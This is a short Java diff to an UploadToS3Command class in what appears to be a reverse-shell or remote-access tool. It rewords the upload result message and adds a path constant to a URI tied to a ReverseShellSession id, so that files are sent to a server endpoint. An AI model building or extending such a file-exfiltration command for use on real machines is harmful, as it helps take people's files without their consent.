@@ -57,7 +57,7 @@ public class UploadToS3Command implements Command {
             Response response= uploadFile(fileToUpload);
             System.out.println(response);
 
-            return "File: "+fileToUpload.getName()+" was uploaded successfully: "+ response.body().string() ;
+            return "File: "+fileToUpload.getName()+" was sent to api endpoint. Api output: "+ response.body().string() ;
         }catch (Exception e){
             e.printStackTrace();
             return "failed with error: " +e.getMessage();
@@ -75,6 +75,7 @@ public class UploadToS3Command implements Command {
 
         String uri = Constants.LOCAL_SERVER_HTTP_URI+
                 Constants.S3_API_ENDPOINT+
+                Constants.S3_API_UPLOAD+
                 Constants.S3_API_UPLOAD_SESSION_PARAM+ ReverseShellSession.getSessionId();
 
         OkHttpClient client = new OkHttpClient().newBuilder()
